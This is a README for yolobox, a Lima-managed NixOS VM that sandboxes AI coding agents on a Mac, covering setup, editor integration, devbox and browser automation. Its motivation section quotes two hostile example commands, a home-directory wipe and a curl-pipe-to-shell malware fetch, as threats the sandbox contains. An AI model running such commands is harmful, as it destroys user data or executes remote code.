# yolobox

A Linux VM on your Mac where AI coding agents do their work.

NixOS machine, run by Lima, devbox, batteries included.

## Why this exists

- Agents blast radius (protects against `rm -rf ~`, `curl http://H4x0r-malware.sh | sh`)
- Supply chain attacks
- Slow MacOS disk due to `systempolicyd` scans

## The UI

### herdr terminal multiplexer

[https://herdr.dev/](https://herdr.dev/)

Guest's herdr is connected with the host. One panel to rule all them agents.

Run `cd myproj && yo enter` or `yo enter <fuzzy search>`


### T3 code web and mobile

[https://t3.codes/](https://t3.codes/)

The single annoyance with the herdr over ssh is, pasting screenshots doen't work.
T3 Code solves this problem, adds mobile app as a bonus.

Run `yo t3` (also can be paired remotely)


### **Zed** and **VS Code** open the VM's project directory over SSH

Run (`yo zed`, `yo code`).

Note: Zed's own downloaded language servers do not work on NixOS: Zed strips the environment when spawning them, and nix-ld cannot rescue that. Add LSPs to `devbox.json` instead, so they run through devbox's own environment rather than Zed's.

VS Code's Remote-SSH works through nix-ld as-is; if it misbehaves, `nixos-vscode-server` is the fallback.

## How To

### Prerequisites

[1Password](https://1password.com/) with its SSH agent enabled (it holds your keys).

```bash
brew install aka-rider/tap/yolobox
```

On Nix, `nix run github:aka-rider/yolobox` runs the same release without a `brew` install at all.

Create and build the VM once:

```bash
yo bootstrap     # create the VM, build NixOS from the pinned yolobox release, seed identities; rerunnable
```

Add this to your `~/.ssh/config`

```
Include ~/.lima/yolobox/ssh.config
```

Then, in any project under your home directory on the Mac:

```bash
cd ~/Developer/some-project
yo link            # adds a "yolobox" git remote; the VM mirrors the same $HOME-relative path
git push yolobox main
yo enter           # ssh into the mirrored directory inside the VM
```

The VM has two accounts: you, the **operator** (`${username}`, matched to your Mac account, the only one with sudo), and `agent`, the account every AI coding session runs as, with no sudo at all.

- `yo ssh` to enter the bare **operator** session (for VM maintenance)
- `yo enter` for daily usage

`yo enter` (and `yo code`, `yo zed`) try to mirror the current directory in the VM, so `cd ~/code/project && yo enter` should land you into `~/code/project` on the VM guest, provided the project does exist.

You can use these commands with fuzzy project name. The search is done among directories with `.git`

If you have `~/code/some-project`, then `yo enter proj`, `yo code proj`, `yo zed proj` will all get you there.

Run `yo --help` for the rest of the commands.

### Devbox

Inside the VM, give the project its toolchain with [devbox](https://www.jetify.com/devbox) (Nix Package Registry).

```bash
devbox init
devbox add typescript bun nodejs
devbox run -- bun --version

# alternatively
devbox shell
```

Find packages with `devbox search <name>`.

## Make the VM your own

First of all, fork the repo, steal the idea, turn into whatever you want.

To add a tool for everyday use, say `helix` or `neovim`, drop it into `/etc/yolobox/local.nix` inside the VM.

Then rebuild:

```bash
sudo YOLOBOX_USERNAME=$(id -un) nixos-rebuild switch --impure --flake 'github:aka-rider/yolobox/v<version>#yolobox'
```


Four settings in `lima/yolobox.yaml` — `disk`, `portForwards`, `memory`, and `cpus` — are read once, when the VM is created. Changing the file later does nothing to an existing VM; stop it and use `limactl edit yolobox`.
For memory and CPUs:

```bash
limactl stop yolobox && limactl edit yolobox --memory 16 --cpus 8 --start
```

## Browser & Virtual Display

The VM runs a virtual display (`:0`, 1920x1080) with two Playwright MCP servers, `playwright-chromium` and `playwright-firefox`, so an agent can drive a real browser and take screenshots. Each project keeps its own
browser profile, so logins survive between sessions.

Playwright MCP output — screenshots, PDFs, videos — stored in `~/artifacts/<project>/`, outside the git checkout. `yolobox-screen-record start|stop` records the whole display and writes flat into `~/artifacts/`, not per project.


## Credits

[Lima: Linux Machines](https://github.com/lima-vm/lima)
[NixOS](https://nixos.org/)
[devbox](https://github.com/jetify-com/devbox)
